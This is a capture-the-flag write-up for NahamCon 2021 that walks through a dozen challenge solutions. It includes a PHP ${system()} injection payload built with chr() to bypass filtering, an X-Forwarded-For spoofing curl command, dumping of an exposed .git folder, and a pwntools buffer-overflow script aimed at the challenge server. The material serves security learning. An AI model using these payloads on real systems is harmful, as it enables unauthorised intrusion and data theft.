# NahamCon 2021 Write-ups
## Beginning tasks
These tasks are "hidden" in website HTML source code or in Discord channel description. They are easy to find.
- Read the rules
- #NahamCon2021
- UHC-BR
- Red Team Village
- Merch Store
- Live Recon Village
- IoT Village
- INE Career Corner
- HTB Village
- The Mission

## The Mission
### Bionic
We were given the website: https://constellations.page and the flag should be from the site.
No flag was found in the HTML or any .css, .js files. However, visiting https://constellations.page/robots.txt and the flag is just there:
```
flag{33b5240485dda77430d3de22996297a1}
```
also with a link to another page: `/meet-the-team.html`

### Meet The Team
There is already a hint to a comment in HTML source code
```html
<!-- Vela, can we please stop sharing our version control software out on the public internet? -->
```
I tried https://constellations.page/.git/ but that folder was locked (403). But I'm guessing the files are accessable. Using the tool I found here to grab all files from .git folder: https://github.com/WangYihang/GitHacker<br/>
After getting all files, we can navigate to the folder, which is a some-what clone, and run `git show` to view changes made. The flag is embeded in the list of employees.
```
flag{4063962f3a52f923ddb4411c139dd24c}
```

### Gus
Using `spiderfoot` OSINT software, I was able to find https://github.com/gusrodry/development. Opening his latest commit, the file `config/.ssh/flag.txt` contains the flag for Gus
```
flag{84d5cc7e162895fa0a5834f1efdd0b32}
```

### Hercules
Navigate to that 1 user who star Gus's repo, who convieniently owns https://github.com/HerculesScox/maintenance. Same as above, `connect.sh` gave us the flag:
```
flag{5bf9da15002d7ea53cb487f31781ce47}
```

## esab64
It's litterally base64 reverse string<br/>
The given string in file provided is
```
mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X
```
Reversing that we get
```
X31lNjFlNzExMTA2YmQwZGIxYjc4ZWZhODk0YjExMjViZntnYWxm
```
Do a base64 decode and we get a reversed flag
```
_}e61e711106bd0db1b78efa894b1125bf{galf
Poof: flag{fb5211b498afe87b1bd0db601117e16e}
```

## Shoelaces
A JPEG image of shoelaces was given. Running `strings` on the file output the flag in the middle.
```
flag{137288e960a3ae9b148e8a7db16a69b0}
```

## Veebee
We were given a .vbe script which is an encrypted .vbs. However it has junks added in the first 3 lines. Removing them and we will have a clean .vbe file.<br/>
Using this online tool https://master.ayra.ch/vbs/vbs.aspx to decrypt it to .vbs
```
flag{f805593d933f5433f2a04f082f400d8c}
```

## Pollex
A file `pollex` was given. Running `file` would show that this is a JPEG.<br/>
Running some tools like steghide binwalk wouldn't show anything.<br/>
It took me a while to realise the thumbnail has tiny text at the bottom (obviously the flag).<br/>
Using the command
```sh
exiftool -b -ThumbnailImage pollex.jpg > thumbnail.jpg
```
to extract the thumbnail image. Typing out the flag...? What? Hell no! Here: https://onlineocr.org/
```
flag{65c34a1ec121a286600ddd48fe36bc00}  // Okay there were mistakes by OCR ¯\_(ツ)_/¯
```

## HTB-LoveTok
We were given a link to hackthebox challenge. Running the instance of LoveTok and we got the link to a page with its source code.<br/>
On the page, a random string countdown time was given with a button to `<link>/?format=r`<br/>
There might be php file inclusion here.<br/>
Reading the source code, it seems like `format` param was used in `date()` function to represent the time in string. We cannot use `'`, `"` or `\` as they are escaped.<br/>
However we can use `${}` to include a php variable. `/format=${phpinfo()}` will show the phpinfo in the page, this confirms we can use `${}`. Now our goal is to get the file `flag` at the root of the container.

We can run `${system()}` to execute a shell command and cat the flag file, however we cannot use symbols, for example, `system(cat flag)` is not valid because `<space>` will be processed in PHP and not in string "cat flag". There is a way to bypass this, using php `chr()` function and concatenate them with `.` (dot).<br/>
Using this command, we can list the files in the root directory
```php
// ls ..
${system(ls.chr(0x20).chr(0x2e).chr(0x2e))}
/* Output
bin boot dev entrypoint.sh etc flagIJGrx home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www
*/
```
You can see we have the file flagIJGrx. Now let's cat it out
```php
// cat ../flagIJGrx
${system(cat.chr(0x20).chr(0x2e).chr(0x2e).chr(0x2F).flagIJGrx)}
```
Voilà, the flag:
```
HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
```

## Homeward Bound
A container containing a website is shown to us. A message shows
```
Sorry, this page is not accessible externally.
```
Seems like we have to trick the server to think we are accessing from localhost.<br/>
Using `X-Forwarded-For` HTTP header, we can achieve this.
```sh
curl 'http://challenge.nahamcon.com:31428/' -H 'X-Forwarded-For: 127.0.0.1' | grep "flag{"
```

## Abyss
Bruh...<br/>
Logging in using the creds provided, we were welcomed with ~~shit~~ ton of texts. Inside that ~~shit~~ ton of texts, there is a flag.
```
flag{db758a0cc25523993416c305ef15f9ad}
```

## Ret2basic
A program `ret2basic` was given along with a container running it.<br/>
Running ghidra, the buffer we are writing to is 112 bytes and we need to get to `win()` function by overriding the return address. After some testing, filling 120 bytes + address would do the trick.<br/>
Here is the python script:
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./ret2basic")
#program = elf.process()
program = remote("challenge.nahamcon.com", 30384)

# Fill 120 bytes and the address of function win()
payload = b"A"*120 + p32(elf.symbols['win'])

program.recvuntil(': ')     # Can you overflow this?: 
program.sendline(payload)
program.recvline()          # Here's your flag.\n
print(program.recvline())   # flag{...}
```
And the flag
```
flag{d07f3219a8715e9339f31cfbe09d6502}
```